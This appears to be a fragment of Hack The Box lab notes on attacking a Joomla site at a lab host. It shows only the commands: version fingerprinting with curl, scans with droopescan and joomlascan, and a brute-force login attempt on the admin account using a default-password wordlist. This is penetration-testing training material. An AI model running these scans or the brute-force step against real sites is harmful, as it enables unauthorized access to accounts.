...
```shell-session
xF1NN@htb[/htb]$ curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
...
```shell-session
xF1NN@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla
...
```shell-session
xF1NN@htb[/htb]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5
...
```shell-session
xF1NN@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
...
```shell-session
xF1NN@htb[/htb]$ sudo pip3 install droopescan
...
```shell-session
xF1NN@htb[/htb]$ droopescan scan joomla --url http://dev.inlanefreight.local/
...
```shell-session
xF1NN@htb[/htb]$ python2.7 -m pip install urllib3
xF1NN@htb[/htb]$ python2.7 -m pip install certifi
xF1NN@htb[/htb]$ python2.7 -m pip install bs4
```
...
```shell-session
xF1NN@htb[/htb]$ python2.7 joomlascan.py -u http://dev.inlanefreight.local
...
```shell-session
xF1NN@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
